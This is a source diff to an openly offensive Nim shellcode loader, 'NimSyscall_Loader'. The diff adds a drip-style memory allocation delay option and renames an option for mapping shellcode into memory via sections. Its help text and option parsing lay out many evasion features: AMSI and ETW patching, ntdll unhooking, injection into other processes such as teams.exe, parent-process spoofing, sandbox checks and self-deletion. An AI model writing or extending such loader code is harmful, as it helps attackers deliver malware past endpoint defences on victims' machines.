@@ -65,7 +65,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.9
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --remoteMapSection --unhook --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms>]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -123,7 +123,7 @@ Options:
   --unhook    Unhook ntdll.dll before doing anything else for the current process
   --obfuscate    Compile the Nim binary via Denim to make use of LLVM obfuscation
   --macPayload    Convert the encrypted Shellcode to MAC-Adresses to reduce entropy (for embedded Payloads only)
-  --sgn    Encode shellcode via SGN before encrypting it´
+  --sgn    Encode shellcode via SGN before encrypting it
   --replace    Replace common nim IoC's in the loader like the string 'nim'
   --noOneShot    By default the Packer uses Hardware Breakpoints to bypass AMSI, but disables it after the payload has been executed. If you want to keep it enabled for the current Thread, use this option.
   --PatchAMSI    Bypass AMSI by patching an offset of amsi.dll/AmsiScanBuffer via Syscalls
@@ -165,10 +165,12 @@ Options:
 
   --shellcode    Encrypt shellcode to load it on runtime
   --dripallocate    Allocate memory Driploader style (multiple small memory chunks after another to avoid memory scans after ETWti/Kernel Callback triggers)
+      --dripsleep 500    Sleep time in ms between each memory allocation (e.G. 500 milisec)
   --CallbackExecute    Execute shellcode via a custom Callback function
   --localCreateThread    Use NtCreateThreadEx for local injection instead of a direct pointer to the shellcode
   --QueueApc    Instead of a direct Pointer or Thread Creation execute the Shellcode via NtQueueApcThread
   --noWait    Don't use 'WaitForSingleObject(-1,-1)' after local Injection but exit the process instead afterwards. If your Shellcode exits the Thread/Process itself, this will not have any effect.
+  --mapSection    Map the shellcode into via NtCreateSection/NtMapViewOfSection . For remote injection decryption will happen AFTER writing the Shellcode into the remote process
   --remoteinject    Inject shellcode a newly spawned process (default notepad) / otherwise it's self injection
       --customprocess procname    Spawn a custom process (instead of notepad) for remote injection
       --remoteprocess procname    Injects into the specified (existing) remote process name, e.g. teams.exe. The loader searches for the first process with that name
@@ -178,7 +180,6 @@ Options:
       --blockDLLs    Set the DllBlocklistPolicy to 1 to prevent DLLs from being loaded
       --remotepatchAMSI    Patch AMSI in the remote process before shellcode execution
       --remotepatchETW    Patch ETW in the remote process before shellcode execution
-      --remoteMapSection    Map the shellcode into the remote process via MapViewOfSection -> decryption will happen AFTER writing the Shellcode into the remote process
 
 [PE Packing]
 
@@ -265,6 +266,7 @@ var
     gosleep: bool = false
     sleeptime: int = 0
     sleepinbetween: int = 0
+    dripsleepinbetween: int = 0
     reflective: bool = false
     hide: bool = false
     apiHide: bool = false
@@ -373,6 +375,10 @@ if args["--jmpEntryFunc"]:
 if args["--dripallocate"]:
     dripallocate = true
 
+if args["--dripsleep"]:
+    dripsleepinbetween = parse_int($args["--dripsleep"])
+    dripsleepinbetween = (dripsleepinbetween)
+
 if args["--csharp"]:
   csharp = true
   shellcode = false
@@ -475,7 +481,7 @@ if args["--remotepatchAMSI"]:
 if args["--remotepatchETW"]:
   remoteETWpatch = true
 
-if args["--remoteMapSection"]:
+if args["--mapSection"]:
   remoteMapSection = true
 
 if args["--noAMSI"]:
@@ -663,9 +669,9 @@ if (useQueueAPC and remoteinject and syswhispers):
     echo "Error: QueueUserAPC not implemented for remote injection with Syswhispers yet. Only Hellsgate and GetSyscallStub."
     quit(1)
 
-if (remoteMapSection and dripallocate):
-    echo "Error: Cannot use both --remoteMapSection and --dripallocate, not implemented yet"
-    quit(1)
+#if (remoteMapSection and dripallocate):
+#    echo "Error: Cannot use both --mapSection and --dripallocate, not implemented yet"
+#    quit(1)
 
 if (peload and dripallocate):
     echo "Error: Cannot use both --peload and --dripallocate, not implemented yet"
@@ -1516,6 +1522,7 @@ when not defined(proxy):
 when defined(Fluctuate):
     import Fluctuation
 
+
 # We use a custom memCopy/copyMem function here, which takes two pointers and a size as input and copies the seccond pointer content into the first
 proc moveMemory(dest: pointer, src: pointer, size: int) =
     var csrc: ptr char = cast[ptr char](src)
@@ -1668,6 +1675,9 @@ for i in 0 ..< rowLen:
 """
 
 let Cryptstub15 = fmt"""
+
+when defined(AllocateDripStyle):
+    var dripsleepinbetween = {dripsleepinbetween}
 
 when defined(JmpEntry):
     var jmpMod: string = obf("{jmpEntryDLL}")
